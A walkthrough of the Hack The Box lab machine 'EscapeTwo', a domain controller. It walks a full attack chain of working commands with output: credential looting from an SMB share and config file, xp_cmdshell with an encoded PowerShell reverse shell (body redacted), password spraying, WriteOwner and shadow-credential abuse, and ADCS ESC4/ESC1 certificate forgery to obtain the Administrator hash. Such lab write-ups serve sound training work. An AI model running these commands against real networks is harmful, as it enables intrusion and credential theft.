---
icon: handcuffs
---

# HTB-ESCAPETWO

<figure><img src="../../../../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>

***

**Privilege Escalation Path**

1. **SMB Access** → Gain access to an SMB share.
2. **Credential Discovery** → Find credentials for the `SA` account stored in an `.xlsx` file.
3. **MSSQL Access** → Use the recovered credentials to log into MSSQL.
4. **Command Execution** → Enable `xp_cmdshell` to execute OS commands and get a shell as `sql_svc`.
5. **Config File Looting** → Retrieve additional credentials from a database configuration file.
6. **Password Spraying** → Use these credentials to log in as `ryan`.
7. **Privilege Delegation Abuse** → Use **WriteOwner** permissions over `ca_svc` to take control of the account.
8. **Certificate Services Exploitation** → Leverage **ESC4** & **ESC1** to escalate privileges and gain a shell as **Administrator**.

***

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```python
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-03 08:04:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T08:06:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-05-03T08:06:13+00:00; 0s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.231.236:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-05-03T08:06:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-03T07:57:50
|_Not valid after:  2055-05-03T07:57:50
| ms-sql-info:
|   10.129.231.236:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T08:06:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-05-03T08:06:13+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49748/tcp open  msrpc         Microsoft Windows RPC
49815/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-05-03T08:05:37
|_  start_date: N/A

```

Based on the open ports I’m dealing with a **Domain Controller** for the `sequel.htb` domain called `DC01`. I add those to my `/etc/hosts` file. Apart from the rather _standard_ ports there’s also **MSSQL** present.

### Initial Access <a href="#initial-access" id="initial-access"></a>

> As is common in real life Windows pentests, you will start the box with credentials for the following account: `rose:KxEPkKe6R8su`

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

#### Shell as sql\_svc <a href="#shell-as-sql_svc" id="shell-as-sql_svc"></a>

Since I already have working credentials I check for accessible **SMB** shares and `Accounting Department` sticks out because this isn’t one of the _default_ or _common_ ones.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ nxc smb dc01.sequel.htb -u rose -p KxEPkKe6R8su --shares
SMB         10.129.231.236  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.236  445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.129.231.236  445    DC01             [*] Enumerated shares
SMB         10.129.231.236  445    DC01             Share           Permissions     Remark
SMB         10.129.231.236  445    DC01             -----           -----------     ------
SMB         10.129.231.236  445    DC01             Accounting Department READ            
SMB         10.129.231.236  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.231.236  445    DC01             C$                              Default share
SMB         10.129.231.236  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.231.236  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.231.236  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.231.236  445    DC01             Users           READ
```

With **nxc** I do spider the share for files and folders matching _anything_. This finds two **XLSX** files with interesting sounding names.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ nxc smb dc01.sequel.htb -u rose \
                          -p KxEPkKe6R8su 
                          --spider "Accounting Department" 
                          --regex '.'
SMB         10.129.231.236  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.236  445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB         10.129.231.236  445    DC01             [*] Started spidering
SMB         10.129.231.236  445    DC01             [*] Spidering .
SMB         10.129.231.236  445    DC01             //10.129.231.236/Accounting Department/. [dir]
SMB         10.129.231.236  445    DC01             //10.129.231.236/Accounting Department/.. [dir]
SMB         10.129.231.236  445    DC01             //10.129.231.236/Accounting Department/accounting_2024.xlsx [lastm:'2024-06-09 13:11' size:10217]
SMB         10.129.231.236  445    DC01             //10.129.231.236/Accounting Department/accounts.xlsx [lastm:'2024-06-09 13:11' size:6780]
SMB         10.129.231.236  445    DC01             [*] Done spidering (Completed in 0.16387939453125)
```

After downloading both of those files with **smbclient** from [impacket](https://github.com/fortra/impacket) I try to open them in Libreoffice but only receive errors. Luckily there’s another way to peak into those documents.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ impacket-smbclient SEQUEL.HTB/rose:KxEPkKe6R8su@dc01.sequel.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
Type help for list of commands
# shares
Accounting Department
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
Users
# use Accounting Department
# ls
drw-rw-rw-          0  Sun Jun  9 13:11:31 2024 .
drw-rw-rw-          0  Sun Jun  9 13:11:31 2024 ..
-rw-rw-rw-      10217  Sun Jun  9 13:11:31 2024 accounting_2024.xlsx
-rw-rw-rw-       6780  Sun Jun  9 13:11:31 2024 accounts.xlsx
# get accounting_2024.xlsx
# get accounts.xlsx
```

Basically those files are ZIP files with specific files inside. I create an output folder and then unzip the contents of `accounts.xlsx` into there. The spreadsheet mostly contains XML files and looking through them, I eventually find multiple credentials in `sharedStrings.xml`.

One of those is very interesting, `sa@sequel.htb:MSSQLP@ssw0rd!`, because this is a high privileged account on **MSSQL** and Microsoft recommends to disable it<sup>1</sup>.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ mkdir out
 
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ unzip -d out accounts.xlsx
Archive:  accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: out/xl/workbook.xml     
  inflating: out/xl/theme/theme1.xml  
  inflating: out/xl/styles.xml       
  inflating: out/xl/worksheets/_rels/sheet1.xml.rels  
  inflating: out/xl/worksheets/sheet1.xml  
  inflating: out/xl/sharedStrings.xml  
  inflating: out/_rels/.rels         
  inflating: out/docProps/core.xml   
  inflating: out/docProps/app.xml    
  inflating: out/docProps/custom.xml  
  inflating: out/[Content_Types].xml
 
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ cat out/xl/sharedStrings.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
```

The credentials do work for port 1433 and I get an interactive SQL shell with `mssqlclient`. Next I try to enable `xp_cmdshell` and it’s successful. A simple `whoami` shows I’m currently running as `sql_svc` on the target machine. Through the same stored procedure I get a reverse shell on the host.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@sequel.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
 
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 
SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   
 
NULL
 
SQL (sa  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAA<REDACTED>"
```

#### Shell as ryan <a href="#shell-as-ryan" id="shell-as-ryan"></a>

```python
PS C:\Windows\system32> Get-Content C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

I’m already in the `sql_svc` context therefore I check for password re-use. **nxc** makes it easy to generate a list of available users with the `--users-export` flag. Then I use this for a password spraying attack and try the password `WqSZAF6CysDQbGb3` on all those users.

As expected it’s valid for `sql_svc` but apparently also works for the user `ryan`.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ nxc ldap dc01.sequel.htb -u rose -p 'KxEPkKe6R8su' --users-export users.txt
LDAP        10.129.231.236  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
LDAP        10.129.231.236  389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
LDAP        10.129.231.236  389    DC01             [*] Enumerated 9 domain users: sequel.htb
LDAP        10.129.231.236  389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.231.236  389    DC01             Administrator                 2024-06-08 18:32:20 0        Built-in account for administering the computer/domain
LDAP        10.129.231.236  389    DC01             Guest                         2024-12-25 15:44:53 1        Built-in account for guest access to the computer/domain
LDAP        10.129.231.236  389    DC01             krbtgt                        2024-06-08 18:40:23 1        Key Distribution Center Service Account
LDAP        10.129.231.236  389    DC01             michael                       2024-06-08 18:47:37 1
LDAP        10.129.231.236  389    DC01             ryan                          2024-06-08 18:55:45 0
LDAP        10.129.231.236  389    DC01             oscar                         2024-06-08 18:56:36 2
LDAP        10.129.231.236  389    DC01             sql_svc                       2024-06-09 09:58:42 0
LDAP        10.129.231.236  389    DC01             rose                          2024-12-25 15:44:54 16
LDAP        10.129.231.236  389    DC01             ca_svc                        2025-05-03 10:47:29 0
LDAP        10.129.231.236  389    DC01             [*] Writing 9 local users to users.txt
 
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ nxc smb dc01.sequel.htb -u users.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success
SMB         10.129.231.236  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.236  445    DC01             [-] sequel.htb\Administrator:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.231.236  445    DC01             [-] sequel.htb\Guest:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.231.236  445    DC01             [-] sequel.htb\krbtgt:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.231.236  445    DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.231.236  445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
SMB         10.129.231.236  445    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.231.236  445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3 
SMB         10.129.231.236  445    DC01             [-] sequel.htb\rose:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.231.236  445    DC01             [-] sequel.htb\ca_svc:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE
```

The user `ryan` is part of the `Remote Management Users` group and can use `evil-winrm` to get a shell on the target. This allows me to read the first flag.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ nxc ldap dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' -M whoami
LDAP        10.129.231.236  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
LDAP        10.129.231.236  389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
WHOAMI      10.129.231.236  389    DC01             distinguishedName: CN=Ryan Howard,CN=Users,DC=sequel,DC=htb
WHOAMI      10.129.231.236  389    DC01             Member of: CN=Management Department,CN=Users,DC=sequel,DC=htb
WHOAMI      10.129.231.236  389    DC01             Member of: CN=Remote Management Users,CN=Builtin,DC=sequel,DC=htb
WHOAMI      10.129.231.236  389    DC01             name: Ryan Howard
WHOAMI      10.129.231.236  389    DC01             Enabled: Yes
WHOAMI      10.129.231.236  389    DC01             Password Never Expires: Yes
WHOAMI      10.129.231.236  389    DC01             Last logon: 133624269862491870
WHOAMI      10.129.231.236  389    DC01             pwdLastSet: 133623393456777728
WHOAMI      10.129.231.236  389    DC01             logonCount: 29
WHOAMI      10.129.231.236  389    DC01             sAMAccountName: ryan
```

#### Shell as Administrator <a href="#shell-as-administrator" id="shell-as-administrator"></a>

Next I run [bloodhound-ce-python](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce) and load the data into **BloodHound**. This gives me an overview over the domain `SEQUEL.HTB` and I can look at possible paths forward.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ bloodhound-ce-python -ns 10.129.231.236 -d sequel.htb -dc dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3 -c ALL --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 05S
INFO: Compressing output into 20250503105830_bloodhound.zip
```

There’s just one outbound edge from `ryan` towards `ca_svc`. `WriteOwner` can, as the name suggests, modify the owner of an object and therefore get extensive rights over it.

<figure><img src="../../../../.gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure>

First I change the owner to my current user `ryan` through `owneredit`. Then I use `dacledit` to grant myself `FullControl` over the object. From there I have multiple options to take over the account `ca_svc`. I could change the password but this would possibly disrupt something and I opt to add [Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials) with [certipy](https://github.com/ly4k/Certipy).

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ impacket-owneredit -action 'write' \
                     -new-owner 'ryan' \
                     -target 'ca_svc' \
                     SEQUEL.HTB/ryan:'WqSZAF6CysDQbGb3'
 
[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
 
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ impacket-dacledit -action 'write' \
                    -rights 'FullControl' \
                    -principal 'ryan' \
                    -target 'ca_svc' \
                    SEQUEL.HTB/ryan:'WqSZAF6CysDQbGb3'
 
[*] DACL backed up to dacledit-20250503-120745.bak
[*] DACL modified successfully!
 
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ certipy-ad shadow -account ca_svc -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' auto
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3fb9133d-c868-c900-dfc8-126cc590893e'
[*] Adding Key Credential with device ID '3fb9133d-c868-c900-dfc8-126cc590893e' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '3fb9133d-c868-c900-dfc8-126cc590893e' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

The `certipy-ad shadow ... auto` does not only add the credentials but also requests a TGT and gets the NTLM hash for the account before removing the credentials again.

Based on the name of the account, it might have to do something with the **Certificate Authority**. `certipy` can also check for common misconfigurations in **Active Directory Certificate Services** (ADCS). Running the tool with the `-vulnerable` flag only prints potential vulnerabilities and finds extensive privileges of the `Cert Publishers` group over the template `DunderMifflinAuthentication`.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ certipy-ad find -u ca_svc@sequel.htb \
                  -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
                  -vulnerable \
                  -stdout \
                  -text
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

Those common misconfigurations are tracked as **ESC1-15**. `ESC4` means that this template can be modified to be vulnerable to `ESC1` and _any_ user requesting a certificate could supply an **subjectAltName**, effectively requesting a certificate for any **other** user<sup>2</sup>.

With the `template` sub command in `certipy` I modify the template `DunderMifflinAuthentication` and then request a certificate for `administrator@sequel.htb`. This writes the PFX file with the certificate to the current directory.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ certipy-ad template -u ca_svc@sequel.htb \
                      -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
                      -template 'DunderMifflinAuthentication' \
                      -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
 
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ certipy-ad req -u ca_svc@sequel.htb \
                 -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
                 -ca 'sequel-DC01-CA' \
                 -template 'DunderMifflinAuthentication' \
                 -upn administrator@sequel.htb \
                 -dns dc01.sequel.htb
 
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 24
[*] Got certificate with multiple identifications
    UPN: 'administrator@sequel.htb'
    DNS Host Name: 'dc01.sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_dc01.pfx'
```

Finally I use the certificate to authenticate and get a TGT and the NTLM hash for the `Administrator` account. Those can be used to get an interactive session on the target.

```python
(sn0x㉿sn0x)-[~/hackthebox/EscapeTwo]
└─$ certipy-ad auth -pfx administrator_dc01.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@sequel.htb'
    [1] DNS Host Name: 'dc01.sequel.htb'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

<figure><img src="../../../../.gitbook/assets/complete (10).gif" alt=""><figcaption></figcaption></figure>
